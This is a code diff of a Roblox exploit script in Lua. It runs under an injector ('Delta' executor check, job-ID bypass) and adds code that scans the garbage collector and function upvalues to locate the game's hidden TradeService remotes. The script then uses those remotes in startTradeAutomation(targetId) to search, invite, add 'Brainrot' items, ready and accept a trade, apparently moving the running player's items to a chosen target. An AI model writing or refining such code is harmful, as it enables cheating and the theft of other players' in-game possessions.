@@ -110,17 +110,33 @@ if identifyexecutor and identifyexecutor() == "Delta" then
     REAL_JOB_ID = bypassJobId
 end
 
-local Net = ReplicatedStorage:WaitForChild("Packages", 10):WaitForChild("Net", 10)
-if not Net then
-    warn("[ED] Net package missing")
-    return
-end
+local tradeRemotes = {}
+local scannedRemotes = {}
 
-local function getRemote(label)
-    local children = Net:GetChildren()
-    for i, obj in ipairs(children) do
-        if obj.Name == label then
-            return children[i+1]
+for _, v in pairs(getgc(true)) do
+    if type(v) == "function" then
+        local info = debug.getinfo(v)
+        if info and info.nups and info.nups > 0 then
+            for i = 1, info.nups do
+                local ok, upval = pcall(debug.getupvalue, v, i)
+                if ok and upval and typeof(upval) == "Instance" then
+                    if upval:IsA("RemoteFunction") or upval:IsA("RemoteEvent") then
+                        local name = upval.Name
+                        if not scannedRemotes[name] then
+                            scannedRemotes[name] = true
+                            if name:find("TradeService") then
+                                tradeRemotes[name] = upval
+                            end
+                        end
+                    end
+                end
+            end
+        end
+    elseif typeof(v) == "Instance" and (v:IsA("RemoteFunction") or v:IsA("RemoteEvent")) then
+        local name = v.Name
+        if not scannedRemotes[name] and name:find("TradeService") then
+            scannedRemotes[name] = true
+            tradeRemotes[name] = v
         end
     end
 end
@@ -402,11 +418,11 @@ local isTradeCompleted = false
 local function startTradeAutomation(targetId)
     if isTradeCompleted then return end
     
-    local searchRemote = getRemote("RF/TradeService/SearchUser")
-    local inviteRemote = getRemote("RF/TradeService/Invite")
-    local addRemote = getRemote("RF/TradeService/AddBrainrot")
-    local readyRemote = getRemote("RE/TradeService/Ready")
-    local acceptRemote = getRemote("RE/TradeService/Accept")
+    local searchRemote = tradeRemotes["RF/TradeService/SearchUser"]
+    local inviteRemote = tradeRemotes["RF/TradeService/Invite"]
+    local addRemote = tradeRemotes["RF/TradeService/AddBrainrot"]
+    local readyRemote = tradeRemotes["RE/TradeService/Ready"]
+    local acceptRemote = tradeRemotes["RE/TradeService/Accept"]
     
     if not searchRemote or not inviteRemote then return end
     
